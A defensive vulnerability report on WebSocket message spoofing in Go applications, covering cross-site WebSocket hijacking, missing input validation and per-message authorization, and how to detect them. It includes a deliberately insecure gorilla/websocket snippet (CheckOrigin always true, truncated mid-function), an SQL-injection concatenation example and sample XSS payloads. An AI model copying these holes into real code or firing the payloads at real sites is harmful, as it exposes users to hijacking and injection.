## **1. Vulnerability Title**

The vulnerability is formally titled: **Message Spoofing via WebSocket in Golang Applications (websocket-msg-spoof)**. This title is chosen for its clarity and specificity, immediately informing the reader about the nature of the vulnerability (Message Spoofing), the affected technology (WebSocket), the specific application environment (Golang Applications), and providing a unique identifier (websocket-msg-spoof) for tracking or reference purposes. The selection of a precise and descriptive title is fundamental in cybersecurity reporting to prevent ambiguity regarding the vulnerability's scope and characteristics.

## **2. Severity Rating**

**Overall Severity: HighðŸŸ  to CriticalðŸ”´**

The severity of "Message Spoofing via WebSocket in Golang Applications" is assessed as **HighðŸŸ  to CriticalðŸ”´**. This rating is a composite, reflecting the potential for severe impact which varies depending on the specific underlying weaknesses exploited to achieve message spoofing. The Common Vulnerability Scoring System (CVSS) provides a framework for contextualizing this severity.

The severity is not monolithic due to "message spoofing" being an outcome that can arise from several distinct vulnerabilities:

- **Cross-Site WebSocket Hijacking (CSWSH) Leading to Remote Code Execution (RCE):** If message spoofing is achieved as a consequence of CSWSH that subsequently enables RCE, the severity is **Critical**. For example, CVE-2025-24964, a CSWSH vulnerability in Vitest, was rated with a CVSS v3.1 base score of 9.6 (Critical) due to its potential for RCE via malicious file writes and test reruns. Similarly, CVE-2024-11045, another CSWSH flaw, also received a 9.6 Critical rating.
    
    
- **Cross-Site Scripting (XSS) via Spoofed Messages:** When message spoofing is utilized to deliver XSS payloads to client browsers, the severity is typically **High**. For instance, CVE-2024-21678, a Stored XSS vulnerability, was assigned a CVSS score of 8.5 (High). Another XSS vulnerability facilitated through WebSocket authentication logic (CVE-2023-41896) was rated 6.1 (Medium), indicating that the precise impact can vary based on context and exploitability.
    

- **Authorization Bypass:** If spoofed messages are used to bypass authorization controls and execute sensitive actions (e.g., data modification, privilege escalation), the severity will be contingent upon the criticality of those actions.

According to CVSS guidelines, High severity vulnerabilities generally possess base scores from 7.0 to 10.0, Medium from 4.0 to 6.9, and Low from 0.0 to 3.9. It has been noted that even Denial of Service (DoS) attacks via WebSockets can carry a high severity score due to their potential for significant impact on system availability.

A crucial consideration is the **compound risk arising from interrelated weaknesses**. Message spoofing is often not an isolated flaw but the culmination of a chain of vulnerabilities. For example, a server-side misconfiguration, such as the failure to validate the `Origin` header during the WebSocket handshake, creates a weakness. This weakness can then be exploited by an attacker using the CSWSH technique. Successful CSWSH allows the attacker to send messages as if they originated from the victimized userâ€”this is the act of message spoofing. If these spoofed messages can then trigger critical operations, such as financial transactions or administrative changes, the overall severity of the message spoofing vulnerability becomes High or Critical, even if the initial `Origin` header flaw, viewed in isolation, might appear less severe. The ultimate impact achievable through this chain dictates the effective severity.

Furthermore, the **context-dependent severity in Golang implementations** cannot be overstated. The actual risk and severity level within a Golang application are heavily influenced by developer choices in configuring and utilizing WebSocket libraries such as `gorilla/websocket` or `nhooyr.io/websocket`. A permissive configuration, for instance, setting the `CheckOrigin` function in `gorilla/websocket` to always return `true` (as demonstrated in some tutorials), directly facilitates CSWSH, thereby increasing the likelihood and ease of exploitation and elevating the overall severity. Golang libraries provide the necessary building blocks, but their secure implementation is the developer's responsibility. The same library, when configured with security best practices in mind, would present a significantly lower risk profile.

## **3. Description**

WebSockets are a communication protocol that provides persistent, full-duplex (bidirectional) communication channels over a single Transmission Control Protocol (TCP) connection. Unlike the traditional Hypertext Transfer Protocol (HTTP) request-response model, WebSockets allow both the server and the client to send data to each other independently and at any time once the connection is established. This capability is ideal for real-time applications such as online chat systems, live data feeds, collaborative editing tools, and online gaming.

In the context of WebSocket security, **"Message Spoofing"** refers to an attacker's ability to transmit unauthorized, falsified, or malicious messages through an established or newly initiated WebSocket connection. This can manifest in several distinct ways:

- **Content Injection:** The attacker injects malicious data (e.g., Cross-Site Scripting (XSS) payloads, harmful commands) into messages that are otherwise structurally valid. This can cause unintended behavior on the server or, more commonly, on other connected clients that receive and process these tainted messages.
- **Identity Impersonation:** The attacker sends messages that appear to originate from a legitimate, authenticated user without that user's knowledge or consent. This is often a direct consequence of vulnerabilities like Cross-Site WebSocket Hijacking (CSWSH) or the theft and reuse of session tokens.
    
- **Unauthorized Command Execution:** The attacker transmits messages that trigger server-side actions or affect other clients, where the actions themselves are ones the attacker is not authorized to perform.

The general implications of successful WebSocket message spoofing are severe and multifaceted. They can include the compromise of data integrity (unauthorized modification of data), loss of data confidentiality (unauthorized disclosure of sensitive information), hijacking of user sessions, execution of arbitrary code within the browsers of legitimate users (XSS), unauthorized modifications to server-side data or business logic, and potentially Denial of Service (DoS) conditions.Common threats associated with WebSockets explicitly include message injection, authentication bypass, session hijacking, and origin spoofing.

An important distinction lies in the target of the spoofing: it can be the **intent of the communication or the identity of the sender**. Failures in input validation, for example, allow an attacker to craft a message with malicious *content*, thereby spoofing its intended benign purpose. Conversely, vulnerabilities like CSWSH allow an attacker to send messages *as another user*, thereby spoofing their identity. Both forms fall under the umbrella of "message spoofing" because the recipient (be it the server or other clients) receives a deceptive or unauthorized message.

This vulnerability often exploits **the "trusted channel" illusion**. Once the initial WebSocket handshake is completed and a persistent connection is established, the application logic might implicitly trust subsequent messages traversing this channel. Message spoofing shatters this illusion by either subverting the integrity of the handshake itself (e.g., through CSWSH due to a lack of `Origin` header validation) or by injecting malicious data into this seemingly trusted stream due to a failure in ongoing message validation. If the initial handshake is compromised, the entire communication channel becomes inherently untrustworthy, allowing an attacker to send spoofed messages. Even with a secure handshake, if individual messages are not validated, the trust placed in the channel is misplaced.

## **4. Technical Description**

The WebSocket protocol facilitates real-time, two-way communication between a client and a server. Understanding its handshake mechanism and how messages are exchanged is crucial to comprehending how message spoofing vulnerabilities arise, particularly in Golang applications.

WebSocket Handshake Process:

The establishment of a WebSocket connection begins with an HTTP/1.1-based handshake.14

1. The client sends an HTTP GET request to the server. This request includes specific headers that signal the intent to upgrade the connection:
    - `Upgrade: websocket`
        
    - `Connection: Upgrade`
        
2. The client generates a unique, random Base64-encoded nonce and sends it in the `Sec-WebSocket-Key` header.
    
3. Browser clients include an `Origin` header, which specifies the origin (scheme, host, port) of the HTML page that initiated the WebSocket request. This header is a critical security component for preventing Cross-Site WebSocket Hijacking (CSWSH).

4. If the server supports WebSockets and agrees to the upgrade, it responds with an HTTP status code of `101 Switching Protocols`. The server's response also includes:
    
    - `Upgrade: websocket`
    - `Connection: Upgrade`
    - `Sec-WebSocket-Accept`: A value derived from the client's `Sec-WebSocket-Key` and a specific GUID, hashed and Base64-encoded. This confirms to the client that the server understood the WebSocket handshake.
    Upon successful completion of this handshake, the underlying TCP connection is repurposed for bidirectional WebSocket message exchange, moving away from the HTTP protocol.

**Mechanisms Enabling Message Spoofing in Golang Applications:**

- A. Lack of Server-Side Input Validation on Received Messages:
    
    This is a prevalent vulnerability where Golang WebSocket handlers fail to adequately sanitize, validate, or correctly parse data received from clients within WebSocket messages.6 Attackers can craft messages containing malicious payloads such as JavaScript for XSS, SQL injection syntax, or operating system commands. If the Golang server-side logic directly uses, stores, or broadcasts this tainted data without proper sanitization or validation against an expected schema, it effectively leads to the message's content being spoofed to be harmful. For instance, a chat application built in Golang might receive a JSON message:
    
    {"user":"attacker","message":"<script>alert('XSS: ' + document.domain)</script>"}
    
    If the message field is directly rendered in other clients' browsers without output encoding, or processed by the server without input sanitization, an XSS vulnerability is exploited.6
    
- B. Cross-Site WebSocket Hijacking (CSWSH):
    
    CSWSH occurs when the Golang WebSocket server inadequately validates the Origin header during the handshake 7 and/or lacks robust CSRF token protection for sessions authenticated via cookies.9 An attacker crafts a malicious script on their own domain. When a victim, who is concurrently authenticated to the vulnerable Golang application, visits the attacker's webpage, this script initiates a WebSocket connection to the vulnerable application's endpoint. The victim's browser automatically appends their session cookies to this cross-origin WebSocket handshake request.9 If the Golang server fails to check the Origin header against a strict allowlist or does not validate a CSRF token, it erroneously accepts this connection. The attacker can then send messages as the victim through this hijacked WebSocket connection, effectively spoofing the victim's identity and any actions performed via those messages.
    
- C. Insecure Session Management & Authentication/Authorization Flaws:
    
    The WebSocket protocol itself does not define or manage authentication or authorization mechanisms.7 These critical security functions must be implemented at the application layer, typically during the initial HTTP handshake phase.19
    
    If this initial authentication is weak (e.g., guessable tokens), missing entirely, or relies solely on HTTP cookies without adequate CSWSH countermeasures (like CSRF tokens and strict Origin checking), unauthorized connections can be established, or legitimate connections can be hijacked.
    
    A significant and common flaw is the lack of per-message authorization. Even if the initial WebSocket connection is securely authenticated, if the Golang application logic does not subsequently verify whether the authenticated user is authorized to perform the specific action requested by each individual WebSocket message, a vulnerability exists. An attacker who has gained control of an authenticated connection (e.g., via CSWSH, or by compromising a less privileged but valid session) can then send unauthorized commands.6 This constitutes spoofing the authorization for the message, even if the sender's identity is technically "authenticated" at the connection level.
    
- D. Unencrypted Communication (Using ws:// instead of wss://):
    
    If the Golang application establishes WebSocket connections using the unencrypted ws:// scheme, all data transmitted over the WebSocket is in plaintext. This renders the communication channel highly susceptible to Man-in-the-Middle (MitM) attacks.6 An attacker positioned on the network path between the client and the server can intercept, read, and, crucially, modify or inject messages in transit. The recipient (client or server) would then receive a message that is not genuinely from the original sender or has been altered, which is a direct form of message spoofing.
    

Role of Golang WebSocket Libraries (e.g., gorilla/websocket, nhooyr.io/websocket):

Golang offers several libraries to facilitate WebSocket development, with gorilla/websocket 8 and nhooyr.io/websocket 26 being popular choices. The standard library also provides golang.org/x/net/websocket, though it's considered lower-level and may lack some advanced features.8

These libraries provide the APIs for upgrading HTTP connections to WebSockets and for sending/receiving WebSocket messages.17 Vulnerabilities related to message spoofing typically arise from the improper or insecure usage of these library features by the application developer.

- For `gorilla/websocket`, the `Upgrader` type has a `CheckOrigin` field. If this function is not implemented, or is implemented to be overly permissive (e.g., `CheckOrigin: func(r *http.Request) bool { return true }`, as shown in tutorials like  and ), it directly creates a CSWSH vulnerability.

    
- For `nhooyr.io/websocket`, the `Accept` function takes `AcceptOptions`, which include `OriginPatterns` and `InsecureSkipVerify`. These must be configured correctly to ensure that only connections from trusted origins are accepted and that origin verification is not bypassed.
    
- The common Golang pattern for handling WebSocket messages involves a dedicated message read loop, often running in a separate goroutine (e.g., `reader()` in , or `readPump()` in `gorilla/websocket` examples ). It is within these loops that per-message input validation and authorization checks must be diligently implemented. A failure to do so means that any message, potentially spoofed, is passed on for processing.
    
The transition from HTTP to WebSocket during the handshake is a critical security boundary. Decisions regarding authentication, `Origin` validation, and CSRF protection made (or omitted) at this stage have profound and lasting implications for the security of the entire persistent WebSocket connection. Failures at this juncture are a primary enabler for many message spoofing scenarios, particularly those involving identity impersonation via CSWSH. The Golang `Upgrader` or `Accept` functions are central to managing this transition and must be configured with security as a priority.

Beyond transport-level (ws vs. wss) and handshake security, message spoofing often exploits vulnerabilities in the application-defined protocol that operates over WebSockets. This includes how message types are defined, what actions they are intended to trigger, and, critically, whether per-action authorization is enforced based on the authenticated user's context. WebSockets provide a message pipe; the *meaning* and *authorization* of those messages are the application's responsibility. If a Golang server receives a message like `{"action":"deleteUser", "userId":123}` but fails to check if the *currently authenticated user* (associated with that WebSocket connection) has the *permission* to delete the *target user*, then an attacker who can send that message (even if authenticated as a low-privilege user, or via CSWSH as another user) can cause unauthorized deletion. This highlights an application-logic flaw facilitated by the WebSocket communication channel, underscoring the need for per-message authorization.

It is also important to distinguish that the "message spoofing" discussed in this report is primarily an application-layer security concern. It does not typically involve raw IP address spoofing for the underlying TCP connection, which is significantly more difficult due to TCP sequence number challenges. Instead, WebSocket message spoofing leverages weaknesses in HTTP-based handshake controls, session management, input validation routines, origin policies, and application-level authorization logic. This distinction is vital for focusing remediation efforts on the correct layers of the application stack.

## **5. Common Mistakes**

Several common mistakes in the design and implementation of WebSocket functionalities in Golang applications can lead to message spoofing vulnerabilities. These errors often stem from a misunderstanding of WebSocket security principles or incorrect usage of library features.

- **A. Neglecting or Improperly Validating the `Origin` Header:**
    - **Description:** A frequent and critical error is the failure to validate the `Origin` HTTP header during the WebSocket handshake. Developers might omit this check entirely, or implement it insecurely, such as by always returning `true` from a `CheckOrigin` function or using overly permissive wildcard matching.
        
    - **Golang Context/Example:** In `gorilla/websocket`, this often manifests as `upgrader.CheckOrigin = func(r *http.Request) bool { return true }` , which effectively disables protection against CSWSH.

        
    - **Consequence:** Directly enables Cross-Site WebSocket Hijacking (CSWSH), allowing malicious websites to initiate WebSocket connections on behalf of a victim user, using their authenticated session.

        
- **B. Insufficient Server-Side Input Validation and Output Encoding:**
    - **Description:** Treating data received via WebSocket messages from clients as inherently trustworthy is a major flaw. This includes failing to validate message structure, data types, content against expected formats, or to sanitize it for malicious characters/sequences.
        
    - **Golang Context/Example:** In message handling loops (e.g., `readPump` in `gorilla/websocket` examples , or custom `reader` functions ), incoming message payloads are often directly processed or broadcast without scrutiny.

        
    - **Consequence:** Leads to injection vulnerabilities such as Cross-Site Scripting (XSS) if unencoded data is sent to other clients, SQL Injection if data is used in database queries, or Command Injection if data influences server-side execution paths.

        
- **C. Weak or Missing Authentication for WebSocket Connections:**
    - **Description:** Failing to implement any authentication mechanism for WebSocket handshakes, allowing anonymous connections. Alternatively, relying solely on HTTP session cookies for authentication without adequate CSRF protection (like anti-CSRF tokens) makes the application vulnerable to CSWSH, as the browser will automatically send cookies with cross-origin WebSocket handshake requests.

        
    - **Golang Context/Example:** Authentication logic must be explicitly added by the developer before calling `upgrader.Upgrade()` in `gorilla/websocket` or `websocket.Accept()` in `nhooyr.io/websocket`.
    - **Consequence:** Unauthorized users can establish connections and potentially send spoofed messages or exploit other weaknesses.
- **D. Lack of Per-Message Authorization:**
    - **Description:** A common oversight is to assume that once a WebSocket connection is authenticated at the handshake stage, all subsequent messages from that connection are implicitly authorized for any action.
        
    - **Golang Context/Example:** Even if user identity is established during the handshake (e.g., via HTTP middleware and stored in `context.Context`), this identity and its associated permissions are often not checked against the specific action or resource requested by each individual WebSocket message within the message handling goroutine.
    - **Consequence:** An authenticated but low-privileged user, or an attacker who has hijacked an authenticated session (e.g., via CSWSH), can send messages to trigger high-privilege actions if these are not individually authorized.
- **E. Using Unencrypted `ws://` Protocol, Especially for Sensitive Data:**
    - **Description:** Deploying WebSockets using the unencrypted `ws://` scheme exposes all transmitted data to eavesdropping and Man-in-the-Middle (MitM) attacks.
        
    - **Golang Context/Example:** This is a deployment choice (server configuration for TLS and client connection URI) rather than a coding error within a specific library function.
    - **Consequence:** Attackers can intercept, read, and potentially modify messages in transit, leading to data leakage and message spoofing.
- **F. Ignoring Security Implications of WebSocket Libraries' Default Configurations:**
    - **Description:** Not fully understanding or incorrectly configuring the security-related features provided by Golang WebSocket libraries. For example, the default `Upgrader` in `gorilla/websocket` does not have a `CheckOrigin` function set by default; if a developer does not provide a secure one, it might operate permissively depending on the library's internal logic for a nil `CheckOrigin`.
    - **Consequence:** Unintended permissive behavior leading to vulnerabilities like CSWSH.
- **G. Not Handling Client Input as Untrusted in Golang Message Loops:**
    - **Description:** Directly processing or broadcasting messages in Golang `reader` or `readPump` functions without performing necessary validation, sanitization, or authorization checks on the message content or the sender's permissions for that specific message type or action.
        
    - **Consequence:** Facilitates various injection attacks (XSS, SQLi) and unauthorized operations.

A prevalent anti-pattern is the **"set and forget" fallacy for security controls**. Developers might implement an initial security check, such as authentication during the handshake , but then fail to maintain vigilance throughout the lifecycle of the persistent WebSocket connection. The stateful, ongoing nature of WebSockets demands continuous validation, especially for messages that trigger actions or handle sensitive data. The explicit warning that "Authorization checks must be applied per message or action, not just at the handshake stage" underscores this common pitfall: authenticating the connection once and then implicitly trusting all subsequent messages from that authenticated pipe, neglecting the need for finer-grained, per-message authorization.

Another area of confusion involves the **`Origin` header's purpose and limitations**. A dual mistake exists: either completely ignoring the `Origin` header, which directly leads to CSWSH vulnerabilities when cookie-based authentication is in use, or, conversely, over-relying on it as a primary authentication mechanism against all client types. Developers may not fully realize that the `Origin` header is essentially advisory and can be spoofed by non-browser clients. Its primary security strength lies in mitigating browser-mediated CSWSH attacks by allowing the server to verify that the request is coming from a trusted web origin. The mistake is either failing to use it for its intended purpose (preventing CSWSH from browsers) or misinterpreting its reliability as a general authentication token against any type of client.

The following table summarizes these common mistakes:

| **Mistake Category** | **Specific Error** | **Golang Context/Example (Conceptual)** | **Consequence** |
| --- | --- | --- | --- |
| Origin Validation Failure | `CheckOrigin` always returns `true` or is missing/weak. | `upgrader.CheckOrigin = func(r *http.Request) bool { return true }` | Enables CSWSH, identity spoofing. |
| Insufficient Input Validation | No sanitization/validation of message content. | `conn.ReadMessage()` then `conn.WriteMessage(type, payload)` without checking `payload`. | XSS, SQLi, command injection via message content. |
| Weak/Missing Handshake Authentication | No auth check before upgrade, or sole reliance on cookies without CSRF token. | Upgrading connection without prior user authentication. | Unauthorized access, CSWSH exploitation. |
| Lack of Per-Message Authorization | Authenticated connection, but no check if user can perform message's action. | User A sends message to delete User B's data; server only checks if User A is logged in. | Privilege escalation, unauthorized data modification/access. |
| Unencrypted Communication | Using `ws://` instead of `wss://`. | Server listening on `ws://` endpoint; client connects to `ws://`. | Man-in-the-Middle attacks, data interception/modification. |
| Ignoring Library Secure Defaults/Config | Not understanding or misconfiguring library security features. | Using default `gorilla/websocket.Upgrader` without setting a restrictive `CheckOrigin` function. | Potentially permissive behavior leading to CSWSH. |
| Untrusted Input in Message Loops | Directly using message data from `ReadMessage` without validation. | `msg_text := string(p); db.Exec("UPDATE users SET bio = '" + msg_text + "' WHERE...")` (SQLi example) | Various injection attacks, logic flaws. |

## **6. Exploitation Goals**

Attackers who successfully exploit WebSocket message spoofing vulnerabilities in Golang applications aim to achieve a variety of malicious objectives, leveraging the real-time, bidirectional nature of the communication channel.

- A. Impersonation of Legitimate Users:
    
    The primary goal is often to send messages or perform actions as if they were another authenticated user. This is typically achieved by exploiting CSWSH, where the attacker hijacks a victim's authenticated WebSocket session, or by obtaining and reusing a victim's session tokens/cookies if other session management flaws exist.9 For example, an attacker might use CSWSH to make a victim's browser send a WebSocket message to post a fraudulent chat message, execute a trade, or transfer funds under the victim's account.
    
- B. Unauthorized Action Execution on the Server:
    
    Attackers aim to trigger server-side functionalities or APIs exposed via WebSockets that they are not legitimately permitted to access. This could involve invoking administrative functions, modifying other users' data, deleting records, or accessing restricted resources.6 For instance, sending a WebSocket message like {"action": "admin_delete_user", "target_user_id": "victim_id"} when the attacker's session lacks administrative rights, but the server fails to perform per-message authorization for the admin_delete_user action.
    
- C. Client-Side Code Injection (Cross-Site Scripting - XSS):
    
    A common objective is to inject malicious scripts (typically JavaScript) into WebSocket messages. If the server broadcasts these messages to other connected clients, or reflects them back to the sender, without proper output encoding, the scripts execute within the context of the victims' browsers.6 This can lead to session token theft from other users, UI redressing, keylogging, or further propagation of attacks.
    
- D. Data Exfiltration:
    
    Attackers may seek to steal sensitive information from the server or from other connected clients. This can be accomplished by injecting commands via spoofed messages that cause the server to respond with sensitive data over the WebSocket, or by leveraging XSS (delivered via a spoofed message) to make other clients' browsers transmit data (e.g., cookies, local storage content, sensitive page information) to an attacker-controlled endpoint.2
    
- E. Data Manipulation/Corruption:
    
    The goal here is to illicitly modify or corrupt data stored on the server or data intended for other clients. This is done by sending WebSocket messages with altered legitimate data or malicious commands that lead to unauthorized data changes.
    
- F. Denial of Service (DoS):
    
    While not always a direct outcome of "spoofing" in the sense of impersonation, message manipulation can lead to DoS conditions. This can occur if an attacker sends malformed messages that crash a Golang message handler, or if they use a hijacked connection (or multiple unauthenticated connections) to flood the server with a high volume of messages, exhausting server resources like CPU, memory, or network bandwidth.6
    
- G. Bypassing Business Logic:
    
    Attackers may send spoofed messages designed to exploit flaws in the application's state management or specific business rules, leading to unintended or advantageous outcomes for the attacker (e.g., manipulating game states, altering voting results, bypassing payment steps).
    

The real-time, persistent nature of WebSockets is a key factor that attackers aim to leverage. Unlike traditional HTTP request/response cycles where effects might be delayed or batched, a spoofed WebSocket message can have instantaneous consequences. In a chat application, an XSS payload delivered via a spoofed WebSocket message executes immediately for all connected users viewing that chat. Similarly, a spoofed command in a live trading platform or an online game would execute instantly, making the impact more direct, potentially more damaging, and harder to contain or revert. This immediacy amplifies the potential harm of successful exploitation.

## **7. Affected Components**

Message spoofing vulnerabilities in Golang WebSocket applications can impact various components of the system, from the server-side logic handling connections and messages to the client-side applications interacting with them.

- **Golang WebSocket Server-Side Logic:**
    - **HTTP Handlers for WebSocket Upgrades:** These are the initial entry points where an HTTP connection is promoted to a WebSocket connection (e.g., functions passed to `http.HandleFunc` in standard Golang, or route handlers in frameworks like Gin). If these handlers do not correctly implement `Origin` header validation, robust authentication checks before upgrading, or CSRF protection where applicable, they are a primary affected component enabling CSWSH and subsequent message spoofing.
        
    - **Message Processing Loops/Goroutines:** Once a WebSocket connection is established, Golang applications typically use dedicated goroutines (e.g., `reader` functions or `readPump` methods as seen in `gorilla/websocket` examples ) to continuously read and process incoming messages. If these routines lack stringent input validation for message content and structure, or fail to perform per-message authorization checks based on the authenticated user's context, they become vulnerable points where spoofed messages can be acted upon.

        
- Specific Golang WebSocket Libraries (When Misused):
    
    The way these libraries are configured and used by the developer determines their susceptibility.
    
    - **`gorilla/websocket`:** Affected if the `Upgrader.CheckOrigin` function is misconfigured (e.g., set to always return `true`, or uses weak validation), or if authentication and authorization are not properly integrated by the developer before the upgrade and within message handlers. The library itself provides the mechanism, but its secure use is the developer's responsibility.
        
    - **`nhooyr.io/websocket`:** Affected if `AcceptOptions.OriginPatterns` are not set or are too permissive, or if `AcceptOptions.InsecureSkipVerify` is set to `true`. Similar to `gorilla/websocket`, secure integration of authentication and per-message authorization logic by the developer is paramount.
        
    - **`golang.org/x/net/websocket`:** Being an older and potentially less feature-rich library , it may require more manual implementation of security controls (like Origin checking and detailed connection management), increasing the surface for developer error if not handled carefully.
        
- **Client-Side Applications:**
    - **Web Browsers of Users:** These are directly affected if message spoofing leads to the delivery of XSS payloads. The malicious scripts execute within the victim's browser context, potentially leading to session hijacking, data theft, or further attacks.
    - **Other WebSocket Clients (Mobile Apps, Desktop Apps):** While the primary focus of this report is on vulnerabilities in the Golang server enabling spoofing, if these non-browser clients also fail to validate or sanitize data received from the server, they could be vulnerable to processing corrupted or malicious data if the server itself is compromised or acts as a propagator of spoofed messages.
        
- Databases and Backend Services:
    
    If spoofed messages successfully inject malicious commands (e.g., SQL injection, OS commands) that are processed by the Golang backend and interact with databases or other downstream services, these systems become indirectly affected components, potentially leading to data breaches, corruption, or further system compromise.
    

The vulnerability often manifests due to a failure in the "weakest link" within the chain of WebSocket connection and message handling. This could be the initial HTTP upgrade handler (lacking Origin checks or authentication), the message read loop (lacking input validation or per-message authorization), or even in how authentication context is (or isn't) effectively propagated and checked throughout the WebSocket session's lifetime. Any component that processes, relies on, or forwards unvalidated or unauthorized WebSocket messages is consequently affected.

It is crucial to understand the division of responsibility between WebSocket libraries and the application developer. While Golang WebSocket libraries provide the necessary functionalities for establishing and managing connections, they do not, by default, secure the application. The developer utilizing the library is ultimately responsible for correctly implementing essential security controls such as `CheckOrigin` validation, input sanitization within message handlers, and appropriate authentication and authorization logic. A common pitfall is the assumption that the library itself handles all aspects of security, which is rarely the case.

## **8. Vulnerable Code Snippet (Golang)**

The following Golang code snippet, using the popular `gorilla/websocket` library, demonstrates a common scenario where vulnerabilities can lead to message spoofing. This example intentionally includes flaws for illustrative purposes.

**Scenario: Missing `CheckOrigin` Validation and No Input Validation in Message Handler**

```Go

package main

import (
	"log"
	"net/http"

	"github.com/gorilla/websocket"
)

// Configure the upgrader
var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
	// VULNERABILITY 1: CheckOrigin always returns true.
	// This disables Origin checking, making the WebSocket endpoint
	// vulnerable to Cross-Site WebSocket Hijacking (CSWSH).
	// An attacker's website can initiate connections to this endpoint
	// using a victim's browser and session cookies.
	CheckOrigin: func(r *http.Request) bool {
		// In a production environment, this should validate r.Header.Get("Origin")
		// against a list of allowed origins.
		return true // INCORRECT: Allows all origins
	},
}

// handleMessages defines how to process incoming messages from a WebSocket connection.
func handleMessages(conn *websocket.Conn) {
	defer conn.Close() // Ensure the connection is closed when the function returns.

	for {
		// Read message from browser
		messageType, p, err := conn.ReadMessage()
		if err!= nil {
			// Log errors, including potential unexpected close errors.
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("error: %v", err)

}
```

**Explanation of Vulnerabilities in the Snippet:**

1. **Permissive `CheckOrigin` (VULNERABILITY 1):** The `CheckOrigin` function within the `websocket.Upgrader` struct is configured to always return `true`. This explicitly disables the Same-Origin Policy protection for WebSocket connections, making the `/ws` endpoint highly vulnerable to Cross-Site WebSocket Hijacking (CSWSH). An attacker can host a malicious script on any website, and if a user (who might be authenticated to the application served on `:8080`) visits that malicious site, the script can successfully establish a WebSocket connection to `ws://localhost:8080/ws` using the victim's browser and any associated cookies. This allows the attacker to send messages as the victim.
2. **Lack of Input Validation/Output Encoding (VULNERABILITY 2):** Inside the `handleMessages` function, the message payload `p` read from the WebSocket connection (`conn.ReadMessage()`) is directly echoed back to the client (`conn.WriteMessage(messageType, p)`) without any form of validation, sanitization, or output encoding. If an attacker sends a message containing an XSS payload (e.g., `"<script>alert('XSS by websocket-msg-spoof')</script>"`), this payload will be sent back and executed in the client's browser. If this message were broadcast to multiple clients in a chat application, all connected clients would be vulnerable to XSS. This is a direct form of message content spoofing. This aligns with vulnerabilities described where input is not treated as untrusted.
3. **Lack of Per-Message Authorization (VULNERABILITY 3, Implicit):** The `handleMessages` function processes incoming messages without any checks to determine if the connected user (even if authenticated at the handshake) is authorized to send that particular type of message or trigger the action it implies. If messages could perform sensitive operations (e.g., `{"action":"delete_data", "id":123}`), any client that can send this message structure could potentially execute the action, regardless of their actual permissions.
4. **Insufficient Authentication Context (VULNERABILITY 4, Implicit):** The `wsEndpoint` function upgrades the connection without explicitly showing robust authentication. If authentication relies solely on cookies, the CSWSH vulnerability (from VULNERABILITY 1) becomes more severe as the attacker can leverage the victim's authenticated session. Furthermore, even if authentication occurs (e.g., in HTTP middleware before `wsEndpoint` is called), the authenticated user's identity and permissions are not explicitly passed to or associated with the `conn` object for use within the `handleMessages` goroutine. This makes per-message authorization (addressing VULNERABILITY 3) difficult to implement correctly.

The permissive configuration of `CheckOrigin` is a silent but critical failure point. Code such as `CheckOrigin: func(r *http.Request) bool { return true }` does not generate runtime errors or warnings; it silently introduces a significant security vulnerability. This highlights a common scenario where developers might use such configurations for ease of development or testing without fully grasping the production security implications, leading directly to CSWSH risks.

Additionally, the launching of `handleMessages` in a new goroutine (`go handleMessages(conn)`) presents a challenge for context propagation. In Golang, `context.Context` is the standard way to carry request-scoped values, including user identity and permissions established by authentication middleware. When a new goroutine is spawned, it does not automatically inherit the HTTP request's context unless explicitly designed to do so. The `gorilla/websocket` `Upgrade` function has access to the `*http.Request`, and thus its context, *at the time of upgrade*. A vulnerability arises if this context, containing crucial user information, is not captured and made available to the `handleMessages` function (e.g., by storing it in a struct associated with the `websocket.Conn`) for performing per-message authorization checks. The provided snippet lacks this mechanism.

## **9. Detection Steps**

Detecting WebSocket message spoofing vulnerabilities in Golang applications requires a multi-faceted approach, combining manual code review, dynamic analysis through penetration testing, and the use of security testing tools.

Manual Code Review (Golang Specific):

A thorough review of the Golang source code is essential, focusing on WebSocket implementation details:

- **Inspect WebSocket Upgrade Handlers:**
    - For applications using `gorilla/websocket`, examine the `Upgrader` configuration. Crucially, determine if the `CheckOrigin` function is implemented and if its logic is secure (i.e., it does not always return `true` and correctly validates the `Origin` header against an allowlist of trusted domains).

    - For applications using `nhooyr.io/websocket`, review the `AcceptOptions` passed to `websocket.Accept`. Ensure `OriginPatterns` are correctly and strictly defined, and that `InsecureSkipVerify` is `false` (which is the default and secure setting).
        
    - Verify that robust authentication is performed *before* the HTTP connection is upgraded to a WebSocket. The identity of the user should be established at this stage.
        
    - If cookie-based authentication is employed, check if anti-CSRF tokens are generated, sent to the client, and validated during the WebSocket handshake to mitigate CSWSH.

- **Inspect WebSocket Message Handlers (e.g., `readPump`, custom loops):**
    - Confirm that all incoming message data is treated as untrusted. Scrutinize the code for rigorous validation (structure, type, length, format) and sanitization of message payloads before they are processed, stored, or broadcast.
    - Assess whether per-message authorization checks are implemented. For messages that trigger sensitive actions or access restricted data, the application must verify that the authenticated user associated with the WebSocket connection has the necessary permissions. This involves checking how user context (identity, roles) is propagated from the handshake to the message handler.

        
    - Ensure that communication is forced over `wss://` (secure WebSockets using TLS) by checking server configuration and client connection logic.


Dynamic Analysis / Penetration Testing:

This involves actively probing the live application to identify vulnerabilities:

- **Origin Header Testing:** Utilize web proxy tools like Burp Suite  or OWASP ZAP's WebSocket tab  to intercept the WebSocket handshake request. Modify the `Origin` header to send different values (e.g., an arbitrary domain, a null origin, a malformed origin) or remove it entirely. If the server establishes a WebSocket connection despite an invalid or untrusted `Origin`, it indicates a high likelihood of CSWSH vulnerability.
    
    
- **Input Fuzzing:** Employ tools (Burp Suite's Repeater/Intruder, ZAP's fuzzing capabilities) to send a wide variety of crafted payloads through WebSocket messages. These payloads should include common XSS vectors, SQL injection strings, command injection attempts, and malformed data structures. Monitor server responses and client-side behavior for indications of successful injection, such as reflected XSS, error messages revealing backend queries, or unexpected application behavior.
    
- **CSWSH Exploitation:** Attempt to create a proof-of-concept (PoC) HTML page hosted on a different origin. This page should contain JavaScript that tries to establish a WebSocket connection to the target application's endpoint and send messages. If this succeeds while a victim is authenticated to the target application, it confirms CSWSH.

    
- **Authentication and Authorization Bypass Testing:**
    - Attempt to establish WebSocket connections without any authentication credentials.
    - Once authenticated (e.g., as a low-privileged user), try to send messages that are intended to trigger actions or access data restricted to higher-privileged users or other specific user accounts. Observe if the server incorrectly processes these unauthorized requests.

**Static Analysis Tools (SAST) for Golang:**

